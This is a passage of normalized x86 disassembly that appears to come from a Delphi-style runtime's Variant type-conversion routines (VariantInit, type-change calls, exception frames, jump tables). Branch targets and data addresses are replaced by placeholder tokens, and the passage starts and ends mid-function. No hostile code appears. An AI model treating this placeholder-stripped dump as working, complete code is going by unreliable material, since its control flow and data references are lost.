movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41160c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411768
fstp [ esp ]
fwait
jmp r-xdata
sub_411ab8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411b64
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412aac
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4041c8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409918
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b6b
lea eax [ ebp - 0x10 ]
call sub_403f40
lea eax [ ebp - 0xc ]
call sub_404620
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ecf0
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ecf0
jmp r-xdata
sub_411b74
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ecf0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411bd4
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ecf0
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411c20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411c75
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f3bc
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411cd0
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411c7c
lea eax [ ebp - 0x18 ]
call sub_40f094
retn
sub_411c84
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414478
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411cd0
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411cec ]
mov eax ebx
call sub_411ab8
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411ab8
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411b74
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411cd0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411c20
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e85c
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411c84
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411ef1 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411bd4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411ab8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411b74
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411cd0
fistp [ esp ]
fwait
jmp r-xdata
sub_41209c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404620
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ecf0
pop ebx
pop ebp
retn 0x8
sub_4120d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404620
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ecf0
pop ebx
pop ebp
retn 0x8
sub_41210c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4121c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404620
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ecf0
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4121c9
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4041c8
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407f0c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_40476c
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4041c8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407ed0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40476c
jmp r-xdata
jmp r-xdata
call sub_40e8f8
sub_4121d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41228f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41226d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ecf0
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404730
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40481c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412274
lea eax [ ebp - 0x10 ]
call sub_40f094
retn
sub_41229c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4122f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f3bc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412384
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4122f9
lea eax [ ebp - 0x10 ]
call sub_40f094
retn
sub_412300
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414478
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412375
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f094
retn
sub_412384
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4128bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4123bd ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f94
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403f40
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f94
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f94
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409844
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f94
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409844
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f94
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41209c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4041c8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4120d4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4041c8
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404730
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40481c
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4041c8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_41210c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4041c8
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f94
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f94
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408474
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f94
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408474
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412384
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4121d0
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f94
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4128c2
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403f64
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404638
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403f64
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_404638
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_41229c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f94
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f94
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e85c
test ah 0x40
je r-xdata
mov eax esi
call sub_403f40
mov edx eax
mov eax ebx
call sub_412300
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_4121d0
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f94
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4121d0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f94
jmp r-xdata
jmp [ eax * 4 + jump_table_412651 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f94
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408388
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409844
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409844
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41209c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4041c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_4120d4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4041c8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404168
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41210c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4041c8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f94
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f94
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408474
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408474
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f94
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412384
jmp r-xdata
sub_4128c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412972
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412955
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40ecf0
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404730
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40481c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41295c
lea eax [ ebp - 0x10 ]
call sub_40f094
retn
sub_412980
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4129d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f3bc
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412aac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4129dd
lea eax [ ebp - 0x10 ]
call sub_40f094
retn
sub_4129e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412a9c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414478
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412aa3
lea eax [ ebp - 0x20 ]
call sub_404620
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412a7f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404730
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40481c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f094
retn
sub_412aac
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412ae6 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40476c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404620
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40476c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409844
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40476c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409844
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40476c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41209c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40465c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4120d4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40465c
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404730
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40481c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_41210c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_40465c
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_408388
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_408474
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40476c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_408474
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412aac
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_4128c8
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40465c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413005
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404638
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403f64
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404638
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403f64
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404638
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403f64
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404638
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403f64
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412980
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40465c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40476c
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40e85c
test ah 0x40
je r-xdata
mov eax esi
call sub_404620
mov edx eax
mov eax ebx
call sub_4129e4
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4128c8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40465c
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_4128c8
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_40465c
jmp r-xdata
jmp [ eax * 4 + jump_table_412d6d ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408388
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40476c
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408388
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_40476c
jmp r-xdata
mov eax [ ebx + 0x8 ]
